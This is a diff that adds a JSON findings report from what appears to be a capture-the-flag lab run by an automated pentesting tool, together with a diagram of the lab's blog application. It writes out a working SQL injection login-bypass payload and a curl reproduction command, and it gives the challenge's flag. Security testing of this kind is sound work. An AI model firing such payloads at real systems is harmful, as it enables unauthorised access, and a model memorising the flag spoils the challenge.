@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T22:17:09.824753+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "450662ae-f662-4bbd-be0d-14d9780eec07",
+      "timestamp": "2026-04-12T22:17:09.824648+00:00",
+      "title": "SQL Injection Authentication Bypass \u2014 Admin Login",
+      "severity": "critical",
+      "target": "http://172.17.0.1:41651/admin.php",
+      "description": "The admin login form at /admin.php is vulnerable to SQL injection. The username parameter is interpolated directly into a SQL query without parameterisation. Submitting a classic OR-bypass payload logs in as admin without knowing the password, and the flag is printed in the response body.",
+      "evidence": "POST /admin.php with body: username=admin' OR '1'='1' -- -&password=anything\n\nResponse body starts with:\nflag{c969819d-7a14-4c90-b85d-51eccd232580}",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -s -X POST http://172.17.0.1:41651/admin.php -d \"username=admin' OR '1'='1' -- -&password=x\"",
+        "expected": "Response contains flag{c969819d-7a14-4c90-b85d-51eccd232580}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "63a69dd8-af72-485b-8a48-57c6b82090a8",
+      "timestamp": "2026-04-12T22:17:19.467157+00:00",
+      "title": "CTF Blog Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser\"] --> IndexPHP[\"GET / index.php - Blog Home\"]\n  Browser --> AdminPHP[\"POST /admin.php - Admin Login\"]\n  IndexPHP --> DB[\"MySQL/MariaDB - posts table\"]\n  AdminPHP --> DB2[\"MySQL/MariaDB - users table\"]\n  AdminPHP --> Flag[\"flag{c969819d-7a14-4c90-b85d-51eccd232580}\"]\n  AdminPHP -->|\"SQLi OR bypass\"| Vuln[\"CRITICAL: SQLi Auth Bypass\"]"
+    }
+  ]
+}
